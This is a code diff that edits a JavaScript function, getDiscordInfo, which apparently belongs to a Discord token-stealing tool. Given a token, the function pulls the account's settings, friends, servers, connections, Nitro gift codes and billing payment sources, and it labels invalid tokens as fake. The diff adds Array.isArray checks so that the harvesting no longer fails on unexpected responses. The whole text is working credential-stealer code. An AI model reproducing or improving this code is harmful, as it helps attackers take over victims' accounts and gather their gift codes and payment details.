@@ -91,7 +91,7 @@ const getStatusEmoji = (s) => {
 const getDiscordInfo = async (t) => {
     let u = await request(`https://discord.com/api/v9/users/@me`, t);
     if (u === "Invalid") return "THIS TOKEN IS FAKE";
-    let s = await request("https://discord.com/api/v9/users/@me/settings", t), r = await request("https://discordapp.com/api/v9/users/@me/relationships", t), g = await request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", t), a = await request("https://discord.com/api/v9/applications", t), c = await request("https://discordapp.com/api/v9/users/@me/connections", t), e = await request("https://discord.com/api/v8/users/@me/entitlements/gifts", t), p = "";
+    let s = await request("https://discord.com/api/v9/users/@me/settings", t), r = await request("https://discordapp.com/api/v9/users/@me/relationships", t); let g = await request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", t), a = await request("https://discord.com/api/v9/applications", t), c = await request("https://discordapp.com/api/v9/users/@me/connections", t), e = await request("https://discord.com/api/v8/users/@me/entitlements/gifts", t), p = "";
     (await request("https://discord.com/api/v9/users/@me/billing/payment-sources", t))?.forEach(s => p += s.brand && s.invalid === 0 ? "<:paypal:1129073151746252870> " : "", p += s.email ? "<a:card:1083014677430284358> " : "");
     if (t) return {
         token: t,
@@ -103,11 +103,11 @@ const getDiscordInfo = async (t) => {
         nitroType: getNitroPremium(await request(`https://discord.com/api/v9/users/${Buffer.from(t.split(".")[0], 'base64').toString('binary')}/profile`, t)),
         avatar: u.avatar ? await getImage(`https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`) : "Avatar Not Found",
         banner: u.banner ? await getImage(`https://cdn.discordapp.com/banners/${u.id}/${u.banner}`) : "Banner Not Found",
-        totalFriend: r.filter((b) => b.type === 1).length,
-        totalBlocked: r.filter((a) => a.type === 2).length,
-        pending: r.filter((r) => r.type === 3).length,
+        totalFriend: Array.isArray(r) ? r.filter((b) => b.type === 1).length : "No Found",
+        totalBlocked: Array.isArray(r) ? r.filter((a) => a.type === 2).length : "No Found",
+        pending: Array.isArray(r) ? r.filter((r) => r.type === 3).length : "No Found",
         NitroGifts: e[0] ? e.map((g) => `${g}, `).join("") : "Nitro Gifts-Codes Not Found",
-        totalOwnedGuild: g?.filter((g) => g.owner).length,
+        totalOwnedGuild: Array.isArray(g) ? g.filter((g) => g.owner).length : "No Found",
         totalApplication: a.length,
         totalConnection: c.length,
         totalGuild: g.length,
